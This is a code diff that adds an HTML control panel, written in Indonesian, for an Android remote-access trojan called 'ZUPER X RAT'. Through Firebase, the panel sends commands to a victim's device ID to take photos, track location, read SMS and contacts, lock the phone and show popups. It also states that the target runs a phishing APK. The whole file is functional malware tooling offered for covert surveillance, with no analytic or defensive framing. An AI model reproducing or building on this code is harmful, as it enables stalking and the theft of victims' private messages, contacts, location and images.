@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>ZUPER X RAT · KIRIM PERINTAH</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+    <style>
+        body {
+            background: #0a0f1e;
+            color: white;
+            font-family: monospace;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: #111;
+            border: 2px solid #ff3300;
+            border-radius: 30px;
+            padding: 25px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 0 20px rgba(255,51,0,0.3);
+        }
+        h2 {
+            text-align: center;
+            color: #ff7733;
+            margin-bottom: 15px;
+        }
+        .info {
+            background: #1a1a1a;
+            padding: 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            word-break: break-all;
+            margin: 15px 0;
+            text-align: center;
+        }
+        select, button {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border-radius: 50px;
+            border: none;
+            font-size: 16px;
+            background: #222;
+            color: white;
+            text-align: center;
+        }
+        button {
+            background: linear-gradient(95deg, #cc3300, #ff6622);
+            color: black;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:active { transform: scale(0.97); }
+        .log {
+            background: black;
+            height: 150px;
+            overflow-y: auto;
+            font-size: 11px;
+            color: #0f0;
+            padding: 8px;
+            border-radius: 16px;
+            margin-top: 15px;
+        }
+        .status {
+            font-size: 12px;
+            text-align: center;
+            margin: 10px 0;
+            color: #ffaa66;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            background: #1a1a1a;
+            border: 1px solid #ff4422;
+            border-radius: 30px;
+            color: white;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h2>💀 ZUPER X RAT · CONTROL</h2>
+    <div class="status">🔗 Terhubung ke Firebase</div>
+    <div class="info">
+        <strong>Target Device ID</strong><br>
+        <input type="text" id="deviceIdInput" placeholder="Masukkan ID korban" value="17287436-11cc-481a-9f44-75fe45681e2e">
+    </div>
+    <select id="cmdSelect">
+        <option value="camera">📸 Ambil Foto (download otomatis)</option>
+        <option value="flash_on">💡 Senter ON</option>
+        <option value="flash_off">💡 Senter OFF</option>
+        <option value="location">📍 Lacak Lokasi</option>
+        <option value="lock">🔒 Lock HP</option>
+        <option value="sms">📨 Baca SMS</option>
+        <option value="contacts">📞 Baca Kontak</option>
+        <option value="popup">⚠️ Kirim Popup</option>
+    </select>
+    <button id="sendBtn">📡 KIRIM PERINTAH</button>
+    <div class="log" id="logBox">>> Siap. Masukkan ID korban lalu kirim perintah.</div>
+</div>
+
+<script>
+    // GANTI DENGAN URL FIREBASE ANDA
+    const firebaseConfig = {
+        databaseURL: "https://YOUR_FIREBASE_URL.firebaseio.com/"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const sendBtn = document.getElementById('sendBtn');
+    const deviceIdInput = document.getElementById('deviceIdInput');
+    const cmdSelect = document.getElementById('cmdSelect');
+    const logBox = document.getElementById('logBox');
+
+    function log(msg) {
+        const time = new Date().toLocaleTimeString();
+        logBox.innerHTML += `<div>[${time}] ${msg}</div>`;
+        logBox.scrollTop = logBox.scrollHeight;
+        if (logBox.children.length > 100) logBox.removeChild(logBox.firstChild);
+    }
+
+    sendBtn.onclick = () => {
+        let deviceId = deviceIdInput.value.trim();
+        if (!deviceId) {
+            log("❌ Masukkan Device ID target!");
+            return;
+        }
+        const cmd = cmdSelect.value;
+        const cmdRef = db.ref("commands").child(deviceId);
+        cmdRef.set({
+            action: cmd,
+            timestamp: Date.now()
+        }).then(() => {
+            log(`✅ Perintah "${cmd}" terkirim ke ${deviceId.substring(0,12)}...`);
+        }).catch(err => {
+            log(`❌ Gagal: ${err.message}`);
+        });
+    };
+
+    log("✅ Panel siap. Pastikan target APK phishing online di Firebase yang sama.");
+</script>
+</body>
+</html>
